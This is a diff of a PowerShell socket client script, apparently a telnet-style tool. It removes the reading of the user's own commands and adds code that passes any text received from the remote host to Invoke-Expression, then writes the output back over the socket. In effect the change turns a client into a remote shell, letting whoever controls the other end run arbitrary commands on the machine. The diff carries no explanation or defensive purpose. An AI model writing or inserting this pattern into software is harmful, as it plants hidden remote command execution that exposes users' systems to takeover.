@@ -50,7 +50,7 @@ function Main
 
     if(-not $scriptedMode)
     {
-        write-host "Connected. Press ^D followed by [ENTER] to exit.`n"
+        write-host "Connected. Press ^C to exit.`n"
     }
 
     $stream = $socket.GetStream()
@@ -90,24 +90,20 @@ function Main
 			$command = ''
             if($output) 
             {
-				$command = Invoke-Expression $output
-				#write-host $commmand
+				if($output.Trim() -ne "") 
+				{ 
+					$command = Invoke-Expression -command $output.Trim()
+					#write-host $output.Trim()
+					#write-host $command
+				}
 				
-                #foreach($line in $output.Split("`n"))
-                #{
-                #   write-host $line
-                #}
                 $SCRIPT:output = ""
             }
 
-            ## Read the user's command, quitting if they hit ^D
-            #$command = read-host
-            #if($command -eq ([char] 4)) { break; }
-
             ## Otherwise, Write their command to the remote host
-			if($command -ne "") 
+			if($command) 
 			{ 
-				$writer.WriteLine($command)
+				$writer.WriteLine([string]$command)
 				$writer.Flush()
 			}
             
